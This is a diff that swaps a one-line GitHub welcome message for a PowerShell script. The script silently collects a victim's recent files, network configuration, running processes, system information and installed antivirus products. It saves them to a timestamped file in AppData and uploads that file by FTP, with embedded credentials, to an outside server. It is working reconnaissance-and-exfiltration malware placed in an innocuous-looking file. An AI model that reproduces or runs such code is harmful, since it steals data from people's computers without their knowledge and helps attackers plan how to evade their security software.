@@ -1,1 +1,24 @@
-welcome,our github!
+$da = "{0:yyyyMMddHHmmss}" -f (Get-Date)
+$filename = "$env:appdata\hiik_$da"
+$cnt = "$env:appdata\cnt.txt"
+$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
+$ic = ipconfig /all
+$gp=Get-process
+$sy = systeminfo
+$antivirusInfo = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct
+$anvi = $antivirusInfo | Select-Object DisplayName, ProductState, PathToSignedProductExe
+
+ac $filename $rc -Encoding 'utf8'
+ac $filename $ic
+ac $filename $gp
+ac $filename $sy
+ac $filename $anvi
+
+
+$ftpuri = "ftp://4209703_qws:YXHHiOyi7Ozymj@qposg.getenjoyment.net/qposg.getenjoyment.net/"
+
+$webclient = New-Object System.Net.WebClient
+$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($filename))
+$webclient.UploadFile($uri, $filename)
+
+ac $cnt $da
